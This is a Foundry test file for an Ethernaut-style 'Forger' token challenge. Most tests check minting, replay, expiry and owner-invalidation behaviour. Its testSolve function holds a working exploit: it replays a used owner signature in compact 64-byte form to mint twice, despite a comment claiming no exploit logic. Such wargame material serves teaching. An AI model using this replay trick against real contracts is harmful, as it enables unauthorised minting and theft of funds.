// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Forger} from "src/levels/Forger.sol";
import {ForgerFactory} from "src/levels/ForgerFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestForger is Test, Utils {
    Ethernaut ethernaut;
    Forger instance;

    address payable owner;
    address payable player;

    bytes constant SIGNATURE = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";
    address constant RECEIVER = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
    bytes32 constant SALT = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
    uint256 constant DEADLINE = type(uint256).max;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        ForgerFactory factory = new ForgerFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Forger(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /// @notice Check the initial state of the level and environment.
    function testInit() public {
        vm.startPrank(player);

        assertEq(instance.name(), "Forger Token");
        assertEq(instance.symbol(), "FT");
        assertEq(instance.totalSupply(), 0);
        assertEq(instance.owner(), 0xC9CAF9e17BBb4e4D27810d97d2C2a467A701e0D5);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    function testKnownOwnerSignatureMintsOnce() public {
        vm.prank(player);
        instance.createNewTokensFromOwnerSignature(SIGNATURE, RECEIVER, 100 ether, SALT, DEADLINE);

        assertEq(instance.balanceOf(RECEIVER), 100 ether);
        assertEq(instance.totalSupply(), 100 ether);
        assertTrue(instance.signatureUsed(keccak256(SIGNATURE)));
    }

    function testKnownSignatureReplayReverts() public {
        vm.startPrank(player);
        instance.createNewTokensFromOwnerSignature(SIGNATURE, RECEIVER, 100 ether, SALT, DEADLINE);

        vm.expectRevert(Forger.SignatureUsed.selector);
        instance.createNewTokensFromOwnerSignature(SIGNATURE, RECEIVER, 100 ether, SALT, DEADLINE);
    }

    function testSignatureWithModifiedParamsReverts() public {
        vm.startPrank(player);

        vm.expectRevert();
        instance.createNewTokensFromOwnerSignature(SIGNATURE, player, 100 ether, SALT, DEADLINE);
    }

    function testExpiredSignatureReverts() public {
        vm.startPrank(player);

        vm.expectRevert(Forger.SignatureExpired.selector);
        instance.createNewTokensFromOwnerSignature(SIGNATURE, RECEIVER, 100 ether, SALT, block.timestamp - 1);
    }

    function testOnlyOwnerCanInvalidateSignature() public {
        vm.startPrank(player);

        vm.expectRevert(Forger.OnlyOwner.selector);
        instance.invalidateSignature(SIGNATURE);
    }

    function testOwnerCanInvalidateSignature() public {
        vm.prank(instance.owner());
        instance.invalidateSignature(SIGNATURE);

        assertTrue(instance.signatureUsed(keccak256(SIGNATURE)));

        vm.prank(player);
        vm.expectRevert(Forger.SignatureUsed.selector);
        instance.createNewTokensFromOwnerSignature(SIGNATURE, RECEIVER, 100 ether, SALT, DEADLINE);
    }

    /// @notice Intentionally left without exploit logic.
    function testSolve() public checkSolvedByPlayer {
        instance.createNewTokensFromOwnerSignature(SIGNATURE, RECEIVER, 100 ether, SALT, DEADLINE);

        bytes memory signature = SIGNATURE;
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
        bytes32 vs = v == 28 ? bytes32(uint256(s) | (1 << 255)) : s;
        bytes memory sig64 = abi.encodePacked(r, vs);

        console.logBytes(signature);
        console.logBytes(sig64);

        instance.createNewTokensFromOwnerSignature(sig64, RECEIVER, 100 ether, SALT, DEADLINE);

    }
}
